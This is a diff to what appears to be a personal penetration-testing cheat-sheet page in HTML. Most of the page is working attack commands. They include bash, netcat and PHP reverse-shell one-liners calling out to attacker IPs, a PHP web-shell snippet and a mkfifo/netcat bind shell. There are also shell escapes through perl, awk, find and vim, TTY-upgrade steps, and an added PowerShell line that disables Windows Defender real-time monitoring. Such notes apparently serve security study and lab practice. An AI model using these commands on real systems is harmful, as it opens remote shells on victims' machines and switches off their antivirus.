@@ -32,7 +32,8 @@
                 
                 <div class="notion-body">
                     <ul>
-                        <a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></li>
+                        <p><a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></p>
+                        <p><a class="notion-link" href="https://www.revshells.com/"> Reverse shell generator</a></p>
                         <h2>Bash</h2>
                         <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
                         <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
@@ -42,11 +43,19 @@
                         <h2>PHP</h2>
                         <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
                         <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
+                        <h3>Bind shell</h3>
+                        <ul>
+                            <p>Client side</p>
+                            <pre><code class="language-php">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f</code></pre>
+
+                            <p>Server side</p>
+                            <pre><code class="language-php">nc -nv 10.129.201.134 7777</code></pre>
+                        </ul>
                     </ul>
                 </div>
 
             <div class="notion-header">
-                <h1 id="TTY treatment" class="top">TTY treatment</h1>
+                <h1 id="TTY treatment">TTY treatment</h1>
             </div>
 
             <div class="notion-body">
@@ -58,9 +67,24 @@ stty raw echo; fg
 reset
 xterm
 export TERM=xterm
-export SHELL=bash</code> </pre>
+export SHELL=bash</code></pre>
                     </ul>
-                </div>
+            </div>
+
+            <div class="notion-header">
+                <h1 id="Interactive Shell">Interactive Shell</h1>
+            </div>
+
+            <div class="notion-body">
+                    <ul>
+                        <p>Here you can find a list of commands to spawn interactive shells inside a linux system</p>
+                        <pre><code class="language-bash">/bin/sh -i                          #sh
+perl —e 'exec "/bin/sh";'           #Perl
+awk 'BEGIN {system("/bin/sh")}'     #awk
+find . -exec /bin/sh \; -quit       #find
+vim -c ':!/bin/sh'                  #vim</code></pre>
+                    </ul>
+                </div>    
                 
             <div class="notion-header">
                 <h1 id="Metasploit">Metasploit</h1>
@@ -80,9 +104,7 @@ export SHELL=bash</code> </pre>
                     <p>Other ways of upgrading it can be found <a class="notion-link" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat">here</a></p>
                     <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
                     <pre><code class="language-python">script /dev/null -c bash</code> </pre>
-                    
-                    
-                </div>
+            </div>
             
              <div class="notion-header"> 
                 <h1 id="Transfer Files">Transfer Files</h1>
@@ -350,6 +372,13 @@ ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pr
 [*] Checking https://inlanefreight.com
 [+] The site https://inlanefreight.com is behind Wordfence (Defiant) WAF.
 [~] Number of requests: 2</code></pre>
+                    </ul>
+
+                    <h2>Disabling AV in Windows</h2>
+                    <ul>
+                        <p>By using the following comand</p>
+                        <pre><code class="language-bash">Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+
                     </ul>
                 </ul>
             </div>
